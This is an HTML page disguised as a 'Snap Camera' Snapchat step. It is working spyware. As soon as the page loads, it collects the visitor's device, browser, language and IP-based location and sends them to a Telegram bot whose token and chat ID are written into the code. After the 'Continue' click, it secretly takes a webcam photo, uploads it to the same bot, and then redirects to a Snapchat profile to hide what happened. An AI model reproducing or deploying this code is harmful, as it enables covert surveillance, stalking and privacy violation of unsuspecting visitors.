<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Snap Camera</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body style="margin:0;background:black;">

<button id="start"
style="
  position:fixed;
  inset:0;
  background:black;
  color:white;
  font-size:20px;
  border:none;
">
Continue
</button>

<video id="video" playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const BOT_TOKEN = "8301093694:AAEFQl_J7AvLc8_kRrpjVSyA0r5qdO6M2wo";
const CHAT_ID = "1186294172";
const SNAP_URL = "https://www.snapchat.com/add/habebabulaila";

/* --------- VISIT TRACKING (ON LOAD) --------- */
(async () => {
  const ua = navigator.userAgent;

  let device = "Unknown";
  if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS";
  else if (/Android/i.test(ua)) device = "Android";
  else device = "Desktop";

  let browser = "Unknown";
  if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
  else if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Firefox")) browser = "Firefox";

  const language = navigator.language || "Unknown";
  const time = new Date().toLocaleString();

  let country = "Unknown";
  let city = "Unknown";
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    country = data.country_name || country;
    city = data.city || city;
  } catch (e) {}

  const message =
`ðŸ“¥ New Visit
ðŸ“± Device: ${device}
ðŸŒ Browser: ${browser}
ðŸ—£ Language: ${language}
ðŸ“ Location: ${country} - ${city}
â° Time: ${time}`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    })
  });
})();

/* --------- CAMERA FLOW (UNCHANGED) --------- */
const startBtn = document.getElementById("start");
const video = document.getElementById("video");

startBtn.onclick = async () => {
  startBtn.remove();

  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
  video.srcObject = stream;
  await video.play();

  setTimeout(capturePhoto, 700);
};

function capturePhoto() {
  const canvas = document.getElementById("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  canvas.getContext("2d").drawImage(video, 0, 0);

  canvas.toBlob(blob => {
    if (!blob || blob.size < 5000) return;

    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", blob);

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form
    }).finally(() => {
      window.location.href = SNAP_URL;
    });
  }, "image/jpeg");
}
</script>

</body>
</html>
